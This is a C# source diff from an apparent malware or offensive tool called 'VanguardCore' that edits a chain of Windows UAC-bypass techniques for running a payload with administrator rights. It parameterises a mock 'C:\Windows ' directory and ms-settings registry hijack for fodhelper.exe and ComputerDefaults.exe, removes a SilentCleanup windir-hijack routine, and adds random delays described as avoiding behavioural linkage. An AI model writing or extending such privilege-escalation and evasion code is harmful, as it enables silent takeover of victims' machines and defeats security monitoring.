@@ -154,6 +154,10 @@ namespace VanguardCore
             } catch { }
         }
 
+        private static bool _isCritical = false;
+        public static bool IsCritical() => _isCritical;
+        public static void SetCriticalInternal(bool state) => _isCritical = state;
+
         public static bool IsInjected()
         {
             return Environment.CommandLine.Contains("--injected");
@@ -254,15 +258,14 @@ namespace VanguardCore
             } catch { return false; }
         }
 
-        public static bool BypassMockDir(string payloadPath, string args, string evName)
+        public static bool BypassMockDir(string payloadPath, string args, string evName, string triggerName = "ComputerDefaults.exe")
         {
             string mockWindows = @"\\?\C:\Windows ";
             string mockSystem32 = Path.Combine(mockWindows, "System32");
             try {
-                Log("Method M: Mock Directory Init...");
+                Log($"Method M: Mock Directory ({triggerName})...");
                 if (!Native.CreateDirectoryW(mockWindows, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
                 if (!Native.CreateDirectoryW(mockSystem32, IntPtr.Zero) && Marshal.GetLastWin32Error() != 183) return false;
-                string triggerName = "ComputerDefaults.exe";
                 string targetPath = Path.Combine(mockSystem32, triggerName);
                 if (!File.Exists(targetPath)) File.Copy(Path.Combine(Environment.SystemDirectory, triggerName), targetPath);
                 using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command")) {
@@ -273,29 +276,6 @@ namespace VanguardCore
                 return false;
             } catch { return false; }
             finally { try { Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false); } catch { } }
-        }
-
-        private static bool BypassSilentCleanup(string payloadPath, string args, string evName)
-        {
-            try {
-                Log("Method H: SilentCleanup Hijack (Symlink)...");
-                string fakeWindir = Path.Combine(Path.GetTempPath(), $"WinUpdate_{Guid.NewGuid():N}.tmp");
-                string sys32 = Path.Combine(fakeWindir, "system32");
-                Directory.CreateDirectory(sys32);
-                
-                // Red Team Hardcore: Use Symbolic Link instead of file copy
-                if (!Native.CreateSymbolicLinkW(Path.Combine(sys32, "cleanmgr.exe"), payloadPath, 0)) {
-                    // Fallback to copy if symlink fails
-                    File.Copy(payloadPath, Path.Combine(sys32, "cleanmgr.exe"));
-                }
-                
-                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).SetValue("windir", fakeWindir);
-                Process.Start(new ProcessStartInfo { FileName = "schtasks.exe", Arguments = "/Run /TN \"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup\" /I", CreateNoWindow = true });
-                bool ok = WaitForAdminSuccess(15000, evName);
-                Registry.CurrentUser.OpenSubKey("Volatile Environment", true).DeleteValue("windir", false);
-                try { Directory.Delete(fakeWindir, true); } catch { }
-                return ok;
-            } catch { return false; }
         }
 
         private static bool BypassAppPaths(string payloadPath, string args, string evName, string target = "control.exe")
@@ -368,15 +348,22 @@ namespace VanguardCore
             
             if (BypassCmluaUtil(payloadPath, args, evName)) return true;
             if (BypassFwCplLua(payloadPath, args)) return true;
-            if (BypassMockDir(payloadPath, args, evName)) return true;
             if (BypassColorDataProxy(payloadPath, args, evName)) return true;
             
-            // Fallback to CurVer with a safer trigger
+            // Wait slightly before fallback to avoid behavioral linkage
+            Thread.Sleep(new Random().Next(2000, 4000));
+
+            // Re-enabled MockDir (Fodhelper trigger)
+            if (BypassMockDir(payloadPath, args, evName, "fodhelper.exe")) return true;
+            
+            // Re-enabled CurVer (ComputerDefaults trigger)
             if (BypassCurVer(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
             
-            Thread.Sleep(new Random().Next(3000, 6000));
             if (BypassAppPaths(payloadPath, args, evName, "control.exe")) return true;
-            if (BypassSilentCleanup(payloadPath, args, evName)) return true;
+            
+            // Final desperate fallback: MockDir (ComputerDefaults)
+            if (BypassMockDir(payloadPath, args, evName, "ComputerDefaults.exe")) return true;
+            
             return false;
         }
 
